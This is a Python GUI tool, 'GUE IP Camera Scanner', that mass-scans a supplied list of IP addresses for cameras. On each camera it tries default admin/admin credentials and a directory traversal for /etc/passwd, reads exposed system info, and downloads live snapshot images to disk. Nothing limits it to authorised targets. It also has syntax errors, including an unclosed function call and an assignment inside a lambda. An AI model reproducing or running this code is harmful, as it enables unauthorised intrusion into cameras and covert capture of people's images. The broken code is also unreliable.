import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import socket
import concurrent.futures
import os
from datetime import datetime
from urllib.parse import urlparse
import warnings
warnings.filterwarnings("ignore")  # Disable SSL warnings

class CameraScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("GUE IP Camera Scanner")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        
        # Configure styles
        self.style = ttk.Style()
        self.style.configure('TFrame', background='#f0f0f0')
        self.style.configure('TLabel', background='#f0f0f0', font=('Arial', 10))
        self.style.configure('TButton', font=('Arial', 10))
        self.style.configure('TEntry', font=('Arial', 10))
        self.style.configure('Header.TLabel', font=('Arial', 12, 'bold'))
        
        # Create main container
        self.mainframe = ttk.Frame(self.root, padding="10")
        self.mainframe.pack(fill=tk.BOTH, expand=True)
        
        # Header
        self.header = ttk.Label(
            self.mainframe, 
            text="GUE Windows IP Camera Vulnerability Scanner", 
            style='Header.TLabel'
        )
        self.header.grid(row=0, column=0, columnspan=3, pady=(0, 15))
        
        # Input Frame
        self.input_frame = ttk.LabelFrame(self.mainframe, text="Scan Parameters", padding="10")
        self.input_frame.grid(row=1, column=0, sticky="ew", padx=5, pady=5)
        
        # IP List File Selection
        ttk.Label(self.input_frame, text="IP List File:").grid(row=0, column=0, sticky="w")
        self.ip_list_entry = ttk.Entry(self.input_frame, width=50)
        self.ip_list_entry.grid(row=0, column=1, padx=5)
        self.browse_btn = ttk.Button(
            self.input_frame, 
            text="Browse...", 
            command=self.browse_ip_file
        )
        self.browse_btn.grid(row=0, column=2)
        
        # Output Directory Selection
        ttk.Label(self.input_frame, text="Output Directory:").grid(row=1, column=0, sticky="w")
        self.output_dir_entry = ttk.Entry(self.input_frame, width=50)
        self.output_dir_entry.grid(row=1, column=1, padx=5)
        self.output_dir_entry.insert(0, os.path.join(os.getcwd(), "scan_results"))
        self.browse_output_btn = ttk.Button(
            self.input_frame, 
            text="Browse...", 
            command=self.browse_output_dir
        )
        self.browse_output_btn.grid(row=1, column=2)
        
        # Port Selection
        ttk.Label(self.input_frame, text="Port:").grid(row=2, column=0, sticky="w")
        self.port_entry = ttk.Entry(self.input_frame, width=10)
        self.port_entry.grid(row=2, column=1, sticky="w", padx=5)
        self.port_entry.insert(0, "34567")
        
        # Threads Selection
        ttk.Label(self.input_frame, text="Threads:").grid(row=3, column=0, sticky="w")
        self.threads_entry = ttk.Entry(self.input_frame, width=10)
        self.threads_entry.grid(row=3, column=1, sticky="w", padx=5)
        self.threads_entry.insert(0, "50")
        
        # Scan Button
        self.scan_btn = ttk.Button(
            self.mainframe, 
            text="Start Scan", 
            command=self.start_scan,
            style='Accent.TButton'
        )
        self.scan_btn.grid(row=2, column=0, pady=10, sticky="ew")
        
        # Results Frame
        self.results_frame = ttk.LabelFrame(self.mainframe, text="Scan Results", padding="10")
        self.results_frame.grid(row=3, column=0, sticky="nsew", padx=5, pady=5)
        
        # Configure grid weights
        self.mainframe.columnconfigure(0, weight=1)
        self.mainframe.rowconfigure(3, weight=1)
        self.results_frame.columnconfigure(0, weight=1)
        self.results_frame.rowconfigure(0, weight=1)
        
        # Results Text Area
        self.results_text = scrolledtext.ScrolledText(
            self.results_frame, 
            wrap=tk.WORD, 
            width=80, 
            height=20,
            font=('Consolas', 10)
        )
        self.results_text.grid(row=0, column=0, sticky="nsew")
        
        # Progress Bar
        self.progress = ttk.Progressbar(
            self.mainframe, 
            orient="horizontal", 
            length=400, 
            mode="determinate"
        )
        self.progress.grid(row=4, column=0, pady=10, sticky="ew")
        
        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        self.status_bar = ttk.Label(
            self.mainframe, 
            textvariable=self.status_var,
            relief=tk.SUNKEN,
            anchor=tk.W
        )
        self.status_bar.grid(row=5, column=0, sticky="ew")
        
        # Configure the style for the accent button
        self.style.configure('Accent.TButton', foreground='white', background='#0078d7')
        
        # Scanner variables
        self.scanning = False
        self.cancel_scan = False
        
    def browse_ip_file(self):
        filename = filedialog.askopenfilename(
            title="Select IP List File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        if filename:
            self.ip_list_entry.delete(0, tk.END)
            self.ip_list_entry.insert(0, filename)
    
    def browse_output_dir(self):
        dirname = filedialog.askdirectory(
            title="Select Output Directory")
        if dirname:
            self.output_dir_entry.delete(0, tk.END)
            self.output_dir_entry.insert(0, dirname)
    
    def start_scan(self):
        if self.scanning:
            self.cancel_scan = True
            self.scan_btn.config(text="Start Scan")
            self.status_var.set("Scan cancelled")
            return
            
        ip_file = self.ip_list_entry.get()
        output_dir = self.output_dir_entry.get()
        port = self.port_entry.get()
        threads = self.threads_entry.get()
        
        if not ip_file:
            messagebox.showerror("Error", "Please select an IP list file")
            return
        
        if not os.path.isfile(ip_file):
            messagebox.showerror("Error", f"File not found: {ip_file}")
            return
            
        try:
            port = int(port)
            if port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Invalid port number (1-65535)")
            return
            
        try:
            threads = int(threads)
            if threads < 1 or threads > 200:
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Invalid thread count (1-200)")
            return
            
        # Create output directory if it doesn't exist
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(os.path.join(output_dir, "screenshots"), exist_ok=True)
        
        # Clear previous results
        self.results_text.delete(1.0, tk.END)
        
        # Start scanning
        self.scanning = True
        self.cancel_scan = False
        self.scan_btn.config(text="Cancel Scan")
        self.status_var.set("Scanning...")
        self.progress["value"] = 0
        
        # Run scan in a separate thread to keep GUI responsive
        import threading
        scan_thread = threading.Thread(
            target=self.run_scan,
            args=(ip_file, output_dir, port, threads),
            daemon=True
        )
        scan_thread.start()
    
    def run_scan(self, ip_file, output_dir, port, max_threads):
        try:
            # Load IP list
            with open(ip_file, 'r') as f:
                ip_list = [line.strip() for line in f if line.strip()]
            
            total_ips = len(ip_list)
            if total_ips == 0:
                self.update_status("IP list is empty")
                return
                
            self.update_progress(0, total_ips)
            self.log_message(f"Starting scan of {total_ips} IP addresses on port {port}\n")
            
            # Scan each IP
            found_cameras = 0
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_ip = {
                    executor.submit(self.check_camera, ip, port, output_dir): ip 
                    for ip in ip_list
                }
                
                for i, future in enumerate(concurrent.futures.as_completed(future_to_ip)):
                    if self.cancel_scan:
                        break
                        
                    ip = future_to_ip[future]
                    try:
                        result = future.result()
                        if result:
                            found_cameras += 1
                            self.log_message(self.format_result(result))
                    except Exception as e:
                        self.log_message(f"Error scanning {ip}: {str(e)}\n")
                    
                    self.update_progress(i+1, total_ips)
            
            # Final report
            self.log_message("\n=== Scan Complete ===\n")
            self.log_message(f"Scanned IPs: {total_ips}\n")
            self.log_message(f"Found cameras: {found_cameras}\n")
            self.log_message(f"Results saved to: {output_dir}\n")
            
        except Exception as e:
            self.log_message(f"\nERROR: {str(e)}\n")
        finally:
            self.scanning = False
            self.update_status(f"Scan complete. Found {found_cameras} cameras.")
            self.root.after(0, lambda: self.scan_btn.config(text="Start Scan"))
    
    def check_camera(self, ip, port, output_dir):
        try:
            # Check if port is open
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                result = s.connect_ex((ip, port))
                if result != 0:
                    return None
                
            self.update_status(f"Found camera at {ip}:{port}")
            
            # Check vulnerabilities
            vulns = []
            
            # 1. Check default credentials
            if self.check_default_credentials(ip, port):
                vulns.append("Default credentials (admin/admin)")
            
            # 2. Check directory traversal
            if self.check_directory_traversal(ip, port):
                vulns.append("Directory traversal vulnerability")
            
            # 3. Check system info exposure
            system_info = self.check_system_info(ip, port)
            if system_info:
                vulns.append(f"System info exposed: {system_info[:50]}...")
            
            # Try to get screenshot
            screenshot_path = self.try_get_screenshot(ip, port, output_dir)
            
            return {
                'ip': ip,
                'port': port,
                'vulnerabilities': vulns,
                'screenshot': screenshot_path
            }
            
        except Exception as e:
            self.log_message(f"Error checking {ip}:{port} - {str(e)}\n")
            return None
    
    def check_default_credentials(self, ip, port):
        login_urls = [
            f"http://{ip}:{port}/login.cgi",
            f"http://{ip}:{port}/cgi-bin/login.cgi",
            f"http://{ip}:{port}/web/login"
        ]
        
        for url in login_urls:
            try:
                data = {"username": "admin", "password": "admin"}
                response = requests.post(url, data=data, timeout=3, verify=False)
                if response.status_code == 200 and "login incorrect" not in response.text.lower():
                    return True
            except:
                continue
        return False
    
    def check_directory_traversal(self, ip, port):
        test_urls = [
            f"http://{ip}:{port}/../../../../etc/passwd",
            f"http://{ip}:{port}/cgi-bin/../../etc/passwd"
        ]
        
        for url in test_urls:
            try:
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200 and "root:" in response.text:
                    return True
            except:
                continue
        return False
    
    def check_system_info(self, ip, port):
        info_urls = [
            f"http://{ip}:{port}/system.info",
            f"http://{ip}:{port}/cgi-bin/getSystemInfo"
        ]
        
        for url in info_urls:
            try:
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) < 500:
                    return response.text.strip()
            except:
                continue
        return None
    
    def try_get_screenshot(self, ip, port, output_dir):
        screenshot_urls = [
            f"http://{ip}:{port}/snapshot.jpg",
            f"http://{ip}:{port}/capture.jpg",
            f"http://{ip}:{port}/image.jpg",
            f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
        ]
        
        for url in screenshot_urls:
            try:
                response = requests.get(url, timeout=3, stream=True, verify=False)
                if response.status_code == 200 and 'image' in response.headers.get('content-type', ''):
                    filename = os.path.join(
                        output_dir, 
                        "screenshots", 
                        f"{ip.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    )
                    with open(filename, 'wb') as f:
                        for chunk in response.iter_content(1024):
                            f.write(chunk)
                    return filename
            except:
                continue
        return None
    
    def format_result(self, result):
        output = f"\n[+] Camera found: {result['ip']}:{result['port']}\n"
        
        if result['vulnerabilities']:
            output += "  - Vulnerabilities:\n"
            for vuln in result['vulnerabilities']:
                output += f"    * {vuln}\n"
        else:
            output += "  - No vulnerabilities detected\n"
            
        if result['screenshot']:
            output += f"  - Screenshot saved: {result['screenshot']}\n"
        else:
            output += "  - Could not capture screenshot\n"
            
        return output
    
    def log_message(self, message):
        self.root.after(0, lambda: self.results_text.insert(tk.END, message))
        self.root.after(0, self.results_text.see, tk.END)
    
    def update_status(self, message):
        self.root.after(0, lambda: self.status_var.set(message))
    
    def update_progress(self, current, total):
        progress = (current / total) * 100
        self.root.after(0, lambda: self.progress["value"] = progress)
        self.update_status(f"Scanning... {current}/{total} ({progress:.1f}%)")

if __name__ == "__main__":
    root = tk.Tk()
    app = CameraScannerGUI(root)
    root.mainloop()